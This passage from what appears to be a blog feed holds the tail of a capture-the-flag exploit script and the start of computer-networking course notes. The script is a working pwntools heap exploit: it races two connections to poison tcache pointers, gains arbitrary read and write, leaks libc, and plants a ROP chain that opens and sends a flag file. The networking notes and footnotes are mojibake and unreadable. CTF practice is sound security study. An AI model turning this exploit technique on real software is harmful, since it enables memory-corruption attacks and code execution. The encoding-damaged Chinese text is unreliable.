<span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        output = <span class="hljs-string">b&#x27;&#x27;</span><br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>.encode())<br>    idx += <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x4040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;printf 10&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        controlled_allocation(r1, r2, addr)<br>        r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>.encode())<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    pwn.context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x4040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value[<span class="hljs-number">0</span>]) == <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SCANF(bytes): &#x27;</span>, value[<span class="hljs-number">0</span>])<br>            r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PROCESS POLL: &#x27;</span>, p.poll())<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SCANF(int): &#x27;</span>, value[<span class="hljs-number">0</span>])<br>            r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>].to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>        <span class="hljs-keyword">return</span><br>    controlled_allocation(r1, r2, addr)<br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat(value))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level2.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level8.0.elf64&quot;</span>)<br>p.clean()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(f.read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br>time.sleep(<span class="hljs-number">0.2</span>)<br>main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAIN ARENA ADDR: &quot;</span>, <span class="hljs-built_in">hex</span>(main_arena_addr))<br>libc_base = main_arena_addr - <span class="hljs-number">0x1bdba0</span><br><span class="hljs-keyword">if</span> libc_base &gt;  <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LIBC BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>    stored_rip_addr = main_arena_addr - <span class="hljs-number">0x1c1d78</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;STORED RIP ADDR: &#x27;</span>, <span class="hljs-built_in">hex</span>(stored_rip_addr))<br>    <span class="hljs-comment">#stored_rip = pwn.u64(arbitrary_read(r1, r2, stored_rip_addr, True)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br>    <span class="hljs-comment">#print(&#x27;STORED RIP: &#x27;, stored_rip)</span><br>    binary_base = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f: <br>        binary_base = <span class="hljs-built_in">int</span>(f.read(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;BINARY BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(binary_base))<br><br>    libc = p.libc<br>    libc.address = libc_base<br>    rop = pwn.ROP(libc, badchars=<span class="hljs-string">b&quot;\x09\x0a\x0b\x0c\x0d\x20&quot;</span>)<br>    rop.call(<span class="hljs-string">&quot;close&quot;</span>, [<span class="hljs-number">3</span>]) <span class="hljs-comment"># used for correctly execute sendfile.</span><br>    rop.call(<span class="hljs-string">&quot;read&quot;</span>, [<span class="hljs-number">0</span>, libc.bss(<span class="hljs-number">0x123</span>), <span class="hljs-number">42</span>])<br>    rop.call(<span class="hljs-string">&quot;open&quot;</span>, [libc.bss(<span class="hljs-number">0x123</span>), <span class="hljs-number">0</span>])<br>    rop.call(<span class="hljs-string">&quot;sendfile&quot;</span>, [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>])<br>    rop.call(<span class="hljs-string">&quot;exit&quot;</span>, [<span class="hljs-number">42</span>])<br><br>    thread3_scanf_return_saveaddress = stored_rip_addr - <span class="hljs-number">0x801460</span><br>    <span class="hljs-comment">#pwn.gdb.attach(p, &#x27;init-pwndbg\nb __isoc99_fscanf\nc\nsp\nthr 3\n&#x27;)</span><br>    <span class="hljs-comment">#input(&quot;press enter to continue&quot;)</span><br>    arbitrary_write(r1, r2, thread3_scanf_return_saveaddress , [rop.chain()], <span class="hljs-literal">True</span>)<br>    <span class="hljs-comment">#pwn.gdb.attach(p, &#x27;init-pwndbg\nb *__isoc99_fscanf+176\nc\nsp\nthr 3\n&#x27;)</span><br>    <span class="hljs-comment">#input(&#x27;press enter to continue&#x27;)</span><br>    r2.sendline(pwn.p64(libc_base+<span class="hljs-number">0x27C2D</span>))<br>    p.send(<span class="hljs-string">b&quot;/flag\0&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED:&quot;</span>, p.clean())<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;FAILED!!!!!&quot;</span>)<br></code></pre></div></td></tr></table></figure><h4 id="level9-6"><a href="#level9-6" class="headerlink" title="level9"></a>level9</h4><img src="../../image/pwn-modules/13160I313S.jpg" alt="23333" style="zoom:50%;" /><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>è¿™é‡Œè¦æŒ‡å‘2å¤„çš„åœ°å€, ä¹Ÿå°±æ˜¯bss+0x10<a href="#fnref:1" rev="footnote" class="footnote-backref"> â†©</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>è¿™é‡Œå¼€å§‹å°±æ˜¯ä»æ”¹å˜åçš„rspå¼¹å‡ºè¿”å›åœ°å€. å¼€å§‹å‡†å¤‡é€šè¿‡putsæ¥leakå¤„libcåœ°å€.<a href="#fnref:2" rev="footnote" class="footnote-backref"> â†©</a></span></span></li><li><span id="fn:3" class="footnote-text"><span>è¿™ä¹‹åè¦æ¥æ”¶putsçš„åœ°å€.<a href="#fnref:3" rev="footnote" class="footnote-backref"> â†©</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Computer Networking</title>
    <link href="/2022-01/Archive-Computer-Networking/"/>
    <url>/2022-01/Archive-Computer-Networking/</url>
    
    <content type="html"><![CDATA[<p>è¿™é‡Œæ˜¯åœ¨å¯’å‡æœŸé—´å¼€å§‹çš„è®¡ç½‘è¯¾æœ¬ç¬”è®°, ä¸ºäº†ä¸‹å­¦æœŸç­‰åˆ°è€å¸ˆè®²æ•…äº‹çš„æ—¶å€™èƒ½è‡ªç„¶çš„å¬ä¸‹å»â€¦â€¦</p><h2 id="ç¬¬ä¸€ç« -æ¦‚è®º"><a href="#ç¬¬ä¸€ç« -æ¦‚è®º" class="headerlink" title="ç¬¬ä¸€ç« : æ¦‚è®º"></a>ç¬¬ä¸€ç« : æ¦‚è®º</h2><blockquote><p>ç›´æ¥å¤åˆ¶(æ¥è‡ª<a href="https://blog.csdn.net/wwj17647590781/article/details/116896442">è¿™é‡Œ</a>), çœæ—¶é—´çœ‹ç¬¬å…«ç‰ˆ, æœ‰æ–°çš„ç»§ç»­è¡¥å……, ç®€å•çš„æ¦‚å¿µç½—åˆ—ä¸æƒ³èŠ±æ—¶é—´äº†, </p></blockquote><h3 id="ä»€ä¹ˆæ˜¯å› ç‰¹ç½‘-ä¸¤ä¸ªè§’åº¦"><a href="#ä»€ä¹ˆæ˜¯å› ç‰¹ç½‘-ä¸¤ä¸ªè§’åº¦" class="headerlink" title="ä»€ä¹ˆæ˜¯å› ç‰¹ç½‘(ä¸¤ä¸ªè§’åº¦)?"></a>ä»€ä¹ˆæ˜¯å› ç‰¹ç½‘(ä¸¤ä¸ªè§’åº¦)?</h3><ul><li><p><strong>ï¼ˆç»„æˆè§’åº¦ï¼‰</strong> ä¸€ç§æ˜¯æè¿°ç»„æˆå®ƒçš„<strong>è½¯ç¡¬ä»¶</strong>ï¼›</p><ul><li><p><strong>ä¸»æœº/ç»ˆç«¯ï¼š</strong> æ‰€æœ‰è¿å…¥å› ç‰¹ç½‘çš„è®¾å¤‡éƒ½æ˜¯ä¸»æœº/ç»ˆç«¯.</p><ul><li><strong>å¦‚ä½•è¿æ¥ï¼Ÿ</strong>ï¼šç«¯ç³»ç»Ÿé€šè¿‡é€šä¿¡é“¾è·¯å’Œåˆ†ç»„äº¤æ¢æœºè¿æ¥åˆ°ä¸€èµ·</li><li><strong>å¦‚ä½•æ¥å…¥å› ç‰¹ç½‘ï¼Ÿ:</strong> ç«¯ç³»ç»Ÿé€šè¿‡å› ç‰¹ç½‘æœåŠ¡æä¾›å•†ï¼ˆInternet Service Providers (ISPs)ï¼‰æ¥å…¥å› ç‰¹ç½‘ã€‚</li></ul></li><li><p><strong>åˆ†ç»„äº¤æ¢æœºï¼š</strong></p><ul><li><p>æœ€æœ‰çš„åˆ†ç»„äº¤æ¢æœºï¼š<strong>è·¯ç”±å™¨</strong> ã€é“¾è·¯äº¤æ¢æœº </p></li><li><p>ä½œç”¨ï¼šä»å®ƒçš„ä¸€æ¡å…¥é“¾è·¯æ¥æ”¶åˆ†ç»„ï¼Œç„¶åä»å®ƒçš„ä¸€æ¡å‡ºé“¾è·¯è½¬å‘åˆ†ç»„ã€‚</p><p>ä¸€ä¸ªåˆ†ç»„æ‰€ç»å†çš„ä¸€ç³»åˆ—é€šä¿¡é“¾è·¯å’Œåˆ†ç»„äº¤æ¢æœºç§°ä¸ºé€šè¿‡è¯¥ç½‘ç»œçš„<strong>è·¯å¾„route/path</strong>ã€‚</p></li><li><p>åŒºåˆ«ï¼šè·¯ç”±å™¨ä¸»è¦ç”¨åœ¨<strong>ç½‘ç»œæ ¸å¿ƒ</strong>ï¼Œé“¾è·¯å±‚äº¤æ¢æœºä¸»è¦ç”¨åœ¨<strong>æ¥å…¥ç½‘</strong>ä¸­</p></li></ul></li><li><p><strong>åˆ†ç»„ï¼š</strong></p><ul><li><strong>ç»„æˆï¼š</strong> <strong>åˆ†ç»„=ç”¨æˆ·æ•°æ®æ®µ+ç›¸åº”çš„å¿…è¦ä¿¡æ¯</strong>ã€‚</li><li><strong>ä½œç”¨ï¼š</strong> ç«¯ç³»ç»Ÿä¹‹é—´å‘é€æ•°æ®æ—¶ï¼Œæˆ‘ä»¬æŠŠæ•°æ®åˆ†æˆä¸€æ®µä¸€æ®µï¼Œç„¶ååŠ ä¸Šå¿…è¦çš„ä¿¡æ¯å½¢æˆä¸€ä¸ªä¸€ä¸ªæ•°æ®åŒ…ï¼Œè¿™ä¸ªæ•°æ®åŒ…ç”¨æœ¯è¯­è¯´å«åšåˆ†ç»„ï¼‰ï¼ˆç›¸åº”çš„æ¥æ”¶ç«¯ä¼šæ ¹æ®è¿™ä¸€ä¸ªä¸€ä¸ªæ•°æ®åŒ…ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸€ä¸ªä¸€ä¸ªåˆ†ç»„ä¸­çš„å¿…è¦ä¿¡æ¯æ¥è·å¾—ç”¨æˆ·æ•°æ®æ®µï¼‰ã€‚</li></ul></li></ul></li><li><p><strong>ï¼ˆåŠŸèƒ½è§’åº¦ï¼‰</strong> å¦ä¸€ç§æ˜¯å°†å…¶è§†ä¸ºä¸ºan infrastructure for providing services to distributed applications.</p><ul><li>End systems attached to the Internet provide a <strong>socket interfaceå¥—æ¥å­—æ¥å£</strong> that specifies how a program running on one end system asks the Internet infrastructure to deliver data to a specific destination program running on another end system.</li><li>å°±æ˜¯ä¸€å †rules</li></ul></li><li><p><strong>åè®®ï¼š</strong></p><ul><li><strong>å®šä¹‰ï¼š</strong> ä¸¤ä¸ªæˆ–å¤šä¸ªé€šä¿¡å®ä½“ï¼ˆä¸ä¸€å®šæ˜¯ç«¯ç³»ç»Ÿï¼Œè¿˜æœ‰å¯èƒ½æ˜¯åˆ†ç»„äº¤æ¢æœºç­‰ï¼‰ä¹‹é—´äº¤æ¢ä¿¡æ¯çš„æ ¼å¼å’Œæ¬¡åºä»¥åŠå¯¹è¯¥ä¿¡æ¯æ‰€é‡‡å–çš„åŠ¨ä½œï¼ˆé€šä¿—æ¥è¯´ï¼šæè¿°é€šä¿¡åŒæ–¹äº¤äº’ä¿¡æ¯çš„æ–¹å¼ï¼Œæ§åˆ¶æŠ¥æ–‡å‘é€æ¥å—ï¼Œç›¸å½“äº<strong>åˆåŒçš„çº¦æŸ</strong>ï¼‰ã€‚</li><li><strong>ä¾‹å­ï¼š</strong><ul><li>ç¡¬ä»¶å®ç°çš„æ§åˆ¶åè®®æ§åˆ¶äº†ä¸¤å—ç½‘å¡ä¹‹é—´çš„æ¯”ç‰¹æµï¼›</li><li>åœ¨ç«¯ç³»ç»Ÿä¸­ï¼Œæ‹¥å¡æ§åˆ¶åè®®æ§åˆ¶äº†å‘é€æ–¹å’Œæ¥æ”¶æ–¹ä¹‹é—´ä¼ è¾“æ•°æ®çš„é€Ÿç‡ç­‰</li></ul></li></ul></li></ul><h3 id="ç½‘ç»œçš„è¾¹ç¼˜"><a href="#ç½‘ç»œçš„è¾¹ç¼˜" class="headerlink" title="ç½‘ç»œçš„è¾¹ç¼˜"></a>ç½‘ç»œçš„è¾¹ç¼˜</h3><ul><li><p><strong>ç«¯ç³»ç»Ÿï¼š</strong> ä¸å› ç‰¹ç½‘ç›¸è¿çš„è®¡ç®—æœºå’Œå…¶å®ƒè®¾å¤‡ï¼Œå¾€å¾€å¤„äºç½‘ç»œçš„è¾¹ç¼˜</p></li><li><p>ç«¯ç³»ç»Ÿåˆ†ç±»ï¼š<strong>å®¢æˆ·ã€æœåŠ¡å™¨</strong> </p><ul><li>å®¢æˆ·ï¼šé€šå¸¸å°±æ˜¯å°å¼ç”µè„‘ï¼Œç¬”è®°æœ¬ç”µè„‘ï¼Œæ‰‹æœºç­‰</li><li>æœåŠ¡å™¨ï¼šä¸€èˆ¬æ˜¯ç”¨äºå­˜å‚¨å’Œå‘å¸ƒWebé¡µé¢ã€ä¸­ç»§ç”µå­é‚®ä»¶ç­‰ï¼Œå±äº<strong>å¤§å‹æ•°æ®ä¸­å¿ƒ</strong>ã€‚</li></ul></li><li><p><strong>æ¥å…¥ç½‘</strong>ï¼šaccess networks</p><ul><li><p><strong>æ¦‚å¿µï¼š</strong> æ˜¯æŒ‡å°†ç«¯ç³»ç»Ÿè¿å…¥åˆ°<strong>è¾¹ç¼˜è·¯ç”±å™¨</strong>çš„<strong>ç‰©ç†é“¾è·¯</strong> </p></li><li><p><strong>è¾¹ç¼˜è·¯ç”±å™¨ï¼š</strong> æ˜¯æŒ‡ç«¯ç³»ç»Ÿåˆ°ä»»ä½•å…¶ä»–è¿œç¨‹ç«¯ç³»ç»Ÿè·¯å¾„ä¸Šçš„<strong>ç¬¬ä¸€å°è·¯ç”±å™¨.</strong> </p></li><li><p><strong>æœ¬åœ°ä¸­å¿ƒå±€</strong> local central office (CO).</p></li><li><p>å®¶åº­æ¥å…¥ï¼š<strong>DSLã€ç”µç¼†</strong>ã€FTTHã€==5G Fixed Wireless== </p></li><li><p><strong>digital subscriber line â€“ DSL(æ•°å­—ç”¨æˆ·çº¿):</strong> å®ƒçš„ISPæ˜¯<strong>æœ¬åœ°ç”µè¯å…¬å¸</strong>ã€‚å…¶ä½¿ç”¨çš„é€šä¿¡é“¾è·¯çš„ç‰©ç†æè´¨ä¸ºç”µè¯çº¿ï¼Œæ˜¯ä¸€ç§åŒç»çº¿ã€‚</p><ul><li>ç”¨æˆ·ä½¿ç”¨<strong>DSLè°ƒåˆ¶è§£è°ƒå™¨</strong>é€šè¿‡ç”µè¯çº¿ä¸ISPä¸­çš„æ•°å­—ç”¨æˆ·çº¿æ¥å…¥å¤ç”¨å™¨ï¼ˆ<strong>digital subscriber line access multiplexer (DSLAM)<strong>ï¼‰æ¥äº¤æ¢æ•°æ®ï¼›</strong>å®¶åº­DSLè°ƒåˆ¶è§£è°ƒå™¨</strong>å°†æ•°å­—æ•°æ®è½¬æ¢ä¸ºé«˜é¢‘éŸ³åé€šè¿‡ç”µè¯çº¿ä¼ è¾“åˆ°ISPä¸­å¿ƒï¼Œå¹¶ä¸”é€šè¿‡<strong>DSLè§£è°ƒå™¨</strong>å°†DSLAMå‘é€è¿‡æ¥çš„æ¨¡æ‹Ÿä¿¡å·è½¬ä¸ºæ•°å­—ä¿¡å·<img src="../../image/Computer_Networking/image-20220116215009788.png" alt="image-20220116215009788" style="zoom:50%;" /></li><li><strong>CIC(Cable Internet Access)ç”µç¼†å› ç‰¹ç½‘æ¥å…¥:</strong> å®ƒçš„ISPæ˜¯<strong>æœ‰çº¿ç”µè§†å…¬å¸</strong>ã€‚å…¶ä½¿ç”¨çš„é€šä¿¡é“¾è·¯çš„ç‰©ç†æè´¨æœ‰<strong>å…‰çº¤å’ŒåŒè½´ç”µç¼†</strong>ï¼Œä¹Ÿè¢«ç§°ä¸ºæ··åˆå…‰çº¤åŒè½´=&gt;<u>hybrid fiber coax (HFC)</u>.<ul><li>ç”¨æˆ·ä½¿ç”¨ç”µç¼†è°ƒåˆ¶è§£è°ƒå™¨é€šè¿‡<strong>åŒè½´ç”µç¼†ä¸å…‰çº¤ç»“ç‚¹</strong>ç›¸è¿ï¼Œå…‰çº¤ç»“ç‚¹é€šè¿‡<strong>å…‰ç¼†ä¸ç”µç¼†å¤´ç«¯ç›¸è¿</strong>ï¼Œè€Œç”µç¼†å¤´ç«¯æ¥å…¥äº†å› ç‰¹ç½‘ã€‚åœ¨<strong>ç”µç¼†å¤´ç«¯</strong>ï¼Œç”µç¼†è°ƒåˆ¶è§£è°ƒå™¨ç«¯æ¥ç³»ç»Ÿï¼ˆ<strong>CMTS</strong>, Cable Modem Termination Systemï¼‰èµ·åˆ°<strong>DSLAMçš„ä½œç”¨</strong>ï¼Œå³å®ç°æ¨¡æ‹Ÿä¿¡å·å’Œæ•°å­—ä¿¡å·çš„è½¬æ¢ï¼›<img src="../../image/Computer_Networking/image-20220116215023365.png" alt="image-20220116215023365" style="zoom: 50%;" /></li></ul></li><li><strong>FTTH(Fiber To The Home)å…‰çº¤åˆ°æˆ·:</strong> è¿™é‡Œä¸»è¦æ˜¯æŒ‡ä½¿ç”¨<strong>å…‰çº¤</strong>ä½œä¸ºé€šä¿¡é“¾è·¯çš„æè´¨ã€‚<ul><li>æœ€ç®€å•çš„å…‰çº¤åˆ†å¸ƒç½‘ç»œç§°ä¸º<strong>ç›´æ¥å…‰çº¤</strong>ï¼Œ<strong>ä»æœ¬åœ°ä¸­å¿ƒå±€åˆ°æ¯æˆ·è®¾ç½®ä¸€æ ¹å…‰çº¤</strong>ï¼Œä¸è¿‡æ›´ä¸ºä¸€èˆ¬çš„æ˜¯ä»ä¸­å¿ƒè·å‡ºæ¥çš„æ¯æ ¹å…‰çº¤å®é™…ä¸Šç”±è®¸å¤šå®¶åº­å…±äº«ï¼Œç›´åˆ°ç›¸å¯¹æ¥è¿‘è¿™äº›å®¶åº­çš„ä½ç½®ï¼Œè¯¥å…‰çº¤æ‰è¢«åˆ†æˆæ¯æˆ·ä¸€æ ¹å…‰çº¤ã€‚ <img src="../../image/Computer_Networking/image-20220116215036114.png" style="zoom:50%;" /></li><li>æœ‰ä¸¤ç§: active optical networks (AONs) and passive optical networks (PONs) </li><li><strong>optical network terminator (ONT)</strong>, which is connected by dedicated optical fiber to a neighborhood splitter</li><li><strong>optical line terminator (OLT)</strong> providing conversion between optical and electrical signals, connects to the Internet via a telco router</li><li>5G fixed wirelesså¼€å§‹è¢«éƒ¨ç½², ç”¨åˆ°äº†beam-forming(æ³¢æŸæˆå½¢) technology, ç®€å•æ¥è®²å°±æ˜¯å°†ä¿¡å·æ³¢é›†ä¸­åœ¨ä¸€ä¸ªæ–¹å‘ä»¥èŠ‚çº¦èƒ½é‡ä»¥åŠæé«˜å¤šç”¨æˆ·ä½¿ç”¨é€Ÿç‡. </li></ul></li></ul></li><li><p><strong>ä¼ä¸šï¼ˆå’Œå®¶åº­ï¼‰æ¥å…¥ï¼š</strong> <strong>ä»¥å¤ªç½‘å’ŒWIFI</strong></p><ul><li><strong>ä»¥å¤ªç½‘ï¼ˆæ˜¯å±€åŸŸç½‘ï¼ˆLANï¼‰ä¸­æœ€æµè¡Œçš„æ¥å…¥æŠ€æœ¯ï¼‰ï¼š</strong> æ¥å…¥æ˜¯ä¸€ç§åœ¨å…¬å¸ã€å¤§å­¦ã€å®¶åº­é‡Œå¾ˆæµè¡Œçš„æ¥å…¥æ–¹å¼ï¼›ç”¨æˆ·ä½¿ç”¨åŒç»çº¿ä¸ä»¥å¤ªç½‘äº¤æ¢æœºç›¸è¿ï¼Œä»è€Œæ¥å…¥å› ç‰¹ç½‘ï¼›æ¥å…¥ä»¥å¤ªç½‘äº¤æ¢æœºçš„é€Ÿåº¦å¯è¾¾100Mbps;</li><li>åœ¨æ— çº¿å±€åŸŸç½‘ä¸­ï¼Œæ— çº¿ç”¨æˆ·ä»ä¸€ä¸ªæ¥å…¥ç‚¹å‘é€å’Œæ¥æ”¶æ•°æ®ï¼Œè€Œè¯¥æ¥å…¥ç‚¹ä¸ä¼ä¸šç½‘ç›¸è¿ï¼Œä¼ä¸šç½‘æœ€ç»ˆæ¥å…¥å› ç‰¹ç½‘ï¼›åœ¨æ— çº¿LANä¸­ï¼Œç”¨æˆ·éœ€è¦åœ¨ä¸€ä¸ªæ¥å…¥ç‚¹çš„å‡ åç±³èŒƒå›´ä¹‹å†…ï¼›<img src="../../image/Computer_Networking/image-20220116215053931.png" alt="image-20220116215053931" style="zoom:50%;" /></li><li><strong>å¹¿åŸŸæ— çº¿æ¥å…¥ï¼š</strong> åœ¨ç§»åŠ¨è®¾å¤‡ä¸­ï¼Œé€šè¿‡èœ‚çªç½‘æä¾›å•†è¿è¥çš„åŸºç«™æ¥å‘é€å’Œæ¥æ”¶åˆ†ç»„ï¼Œä¸WIFIä¸åŒçš„æ˜¯ï¼Œç”¨æˆ·ä»…éœ€è¦ä½äºåŸºç«™çš„æ•°ä¸‡ç±³èŒƒå›´ä¹‹å†…å³å¯ï¼›</li></ul></li><li><p><strong>Wide-Area Wireless Access: 3G and LTE 4G and 5G</strong> </p><ul><li>nothing special, wait until Chapter 7.</li></ul></li></ul></li><li><p><strong>ç¡¬ä»¶è®¾å¤‡ï¼š</strong></p><ul><li><strong>ä¼ è¾“åª’ä½“</strong>æ˜¯æ„æˆé€šä¿¡é“¾è·¯çš„ä¸»è¦éƒ¨åˆ†ï¼Œç‰©ç†åª’ä½“é€šå¸¸å¯ä»¥åˆ†ä¸º<strong>å¯¼å¼•æ€§åª’ä½“</strong>å’Œ<strong>éå¯¼å¼•æ€§åª’ä½“</strong><ul><li><strong>å¯¼å¼•æ€§åª’ä½“ï¼š</strong> ä¿¡å·æ²¿ç€å›ºä½“å‰è¡Œ</li><li><strong>éå¯¼å¼•æ€§åª’ä½“ä¸­ï¼š</strong> ä¿¡å·æ²¿ç€å›ºä½“åª’ä½“å‰è¡Œ</li></ul></li><li><strong>åŒç»çº¿twisted-pairï¼š</strong> æœ€ä¾¿å®œçš„<strong>å¼•å¯¼æ€§</strong>ä¼ è¾“åª’ä½“ï¼Œç”±ä¸¤æ¡ç›¸äº’èºæ—‹ç¼ ç»•çš„é“œçº¿ç»„æˆã€‚æ˜¯å±€åŸŸç½‘çš„æœ€ä½³é€‰æ‹©.</li><li><strong>åŒè½´ç”µç¼†Coaxial cable:</strong> å€ŸåŠ©ç‰¹æ®Šçš„ç»“æ„å’Œç»ç¼˜å±‚ï¼ŒåŒè½´ç”µç¼†å¯å¾—åˆ°è¾ƒé«˜çš„æ•°æ®ä¼ è¾“é€Ÿç‡ï¼›åœ¨ç”µè§†ç³»ç»Ÿä¸­åº”ç”¨å¹¿æ³›ï¼›åŒè½´ç”µç¼†å¯è¢«ç”¨ä½œ <strong>å¼•å¯¼æ€§</strong>çš„å…±äº«åª’ä½“ï¼›</li><li><strong>å¤šæ¨¡å…‰çº¤ç¼†multimode fiber-optic cable:</strong> ä¸€ç§å¯ä»¥å¼•å¯¼å…‰è„‰å†²çš„åª’ä½“</li><li><strong>é™†åœ°æ— çº¿ç”µé¢‘è°±terrestrial radio spectrum:</strong> æ— 